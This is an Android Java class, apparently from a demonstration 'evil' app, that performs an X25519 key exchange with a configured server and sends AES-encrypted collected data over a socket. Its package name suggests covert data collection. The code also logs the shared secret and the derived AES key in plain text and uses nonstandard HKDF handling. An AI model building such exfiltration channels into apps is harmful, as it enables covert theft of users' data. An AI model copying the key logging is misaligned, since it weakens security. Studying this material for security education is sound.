package com.example.evilopsecapp.datacollection;

import static android.provider.Settings.System.getString;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.Cipher;
import javax.crypto.KeyAgreement;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import com.example.evilopsecapp.R;
import com.example.evilopsecapp.helpers.AppContext;

import java.util.Arrays;
import org.bouncycastle.crypto.generators.HKDFBytesGenerator;
import org.bouncycastle.crypto.params.HKDFParameters;
import org.bouncycastle.crypto.digests.SHA256Digest;
public class ECDHClient {
    private static final String TAG = "ECDHClient";

    private static final String SERVER_IP = AppContext.getContext().getString(R.string.server_ip);
    private static final int SERVER_PORT = Integer.parseInt(AppContext.getContext().getString(R.string.server_port));

    // X.509 Header for X25519 Public Keys (Needed for Android)
    private static final byte[] X25519_X509_HEADER = new byte[]{
            0x30, 0x2a, 0x30, 0x05, 0x06, 0x03, 0x2b, 0x65, 0x6e, 0x03, 0x21, 0x00
    };

    public static void sendSecureData(String data) {
        try {
            // Generate ECDH key pair
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("X25519");
            KeyPair clientKeyPair = keyPairGenerator.generateKeyPair();
            byte[] clientPublicKeyBytes = clientKeyPair.getPublic().getEncoded();
            byte[] rawPublicKeyBytes = clientPublicKeyBytes;

            // ✅ Ensure exactly 32 bytes (trim leading zero if needed)
            if (rawPublicKeyBytes.length > 32) {
                rawPublicKeyBytes = Arrays.copyOfRange(rawPublicKeyBytes, rawPublicKeyBytes.length - 32, rawPublicKeyBytes.length);
            } else if (rawPublicKeyBytes.length < 32) {
                // Pad with leading zeros if it's shorter than 32 bytes
                byte[] paddedKey = new byte[32];
                System.arraycopy(rawPublicKeyBytes, 0, paddedKey, 32 - rawPublicKeyBytes.length, rawPublicKeyBytes.length);
                rawPublicKeyBytes = paddedKey;
            }

            // Key debugging
            String base64PublicKey = Base64.encodeToString(rawPublicKeyBytes, Base64.NO_WRAP);
            Log.d(TAG, "\uD83D\uDD11 Client Public Key (Base64: "+base64PublicKey);

            // Connect to server
            Socket socket = new Socket(SERVER_IP, SERVER_PORT);
            OutputStream outputStream = socket.getOutputStream();
            InputStream inputStream = socket.getInputStream();

            // Send client's public key to server
            outputStream.write(rawPublicKeyBytes);
            outputStream.flush();

            // Receive server's public key (ensure full 32 bytes are received)
            byte[] serverPublicKeyBytes = new byte[32];
            int totalBytesRead = 0;
            while (totalBytesRead < 32) {
                int bytesRead = inputStream.read(serverPublicKeyBytes, totalBytesRead, 32 - totalBytesRead);
                if (bytesRead == -1) {
                    Log.d(TAG, "❌ Error: Connection closed before full public key was received!");
                    socket.close();
                    return;
                }
                totalBytesRead += bytesRead;
            }

            // Debugging server public key
            String base64ServerPublicKey = Base64.encodeToString(serverPublicKeyBytes, Base64.NO_WRAP);
            Log.d(TAG, "\uD83D\uDD11 Server Public Key (Base64): "+base64ServerPublicKey);

            // ✅ Fix: Wrap raw public key with an X.509 header
            byte[] x509EncodedPublicKey = new byte[X25519_X509_HEADER.length + serverPublicKeyBytes.length];
            System.arraycopy(X25519_X509_HEADER, 0, x509EncodedPublicKey, 0, X25519_X509_HEADER.length);
            System.arraycopy(serverPublicKeyBytes, 0, x509EncodedPublicKey, X25519_X509_HEADER.length, serverPublicKeyBytes.length);

            // ✅ Convert properly formatted key into a PublicKey object
            KeyFactory keyFactory = KeyFactory.getInstance("X25519");
            PublicKey serverPublicKey = keyFactory.generatePublic(new X509EncodedKeySpec(x509EncodedPublicKey));

            // Compute shared secret using ECDH
            KeyAgreement keyAgreement = KeyAgreement.getInstance("X25519");
            keyAgreement.init(clientKeyPair.getPrivate());
            keyAgreement.doPhase(serverPublicKey, true);
            byte[] sharedSecret = keyAgreement.generateSecret();

            // Shared secret debugging
            String base64SharedSecret = Base64.encodeToString(sharedSecret, Base64.NO_WRAP);

            Log.d(TAG, "\uD83D\uDD10 Shared Secret (Base64): " + Base64.encodeToString(sharedSecret, Base64.NO_WRAP));

            // Derive AES key using HKDF
            SecretKey aesKey = new SecretKeySpec(hkdfExtractExpand(sharedSecret, "ecdh-key-exchange", 32), "AES");

            Log.d(TAG, "\uD83D\uDD11 Derived AES Key (Base64): " + Base64.encodeToString(aesKey.getEncoded(), Base64.NO_WRAP));

            // Encrypt data using AES
            byte[] encryptedData = encryptData(data, aesKey);

            // Send encrypted data
            outputStream.write(encryptedData);
            outputStream.flush();

            Log.d(TAG, "✅ Data sent successfully!");
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] hkdfExtractExpand(byte[] inputKeyMaterial, String info, int outputSize) throws Exception {
        byte[] salt = new byte[16];  // Must match Python salt

        // ✅ FIX: Correct PRK calculation (match Python)
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] prk = digest.digest(inputKeyMaterial);  // ✅ Match Python's PRK computation

        // ✅ Use BouncyCastle HKDF for expansion
        HKDFBytesGenerator hkdf = new HKDFBytesGenerator(new SHA256Digest());
        hkdf.init(new HKDFParameters(prk, salt, info.getBytes("UTF-8")));

        byte[] okm = new byte[outputSize];
        hkdf.generateBytes(okm, 0, outputSize);

        return okm;
    }

    private static byte[] encryptData(String data, SecretKey aesKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);

        cipher.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(iv));

        byte[] encrypted = cipher.doFinal(data.getBytes("UTF-8"));

        // Prepend IV to the ciphertext
        byte[] encryptedWithIv = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, encryptedWithIv, 0, iv.length);
        System.arraycopy(encrypted, 0, encryptedWithIv, iv.length, encrypted.length);

        return encryptedWithIv;
    }
}
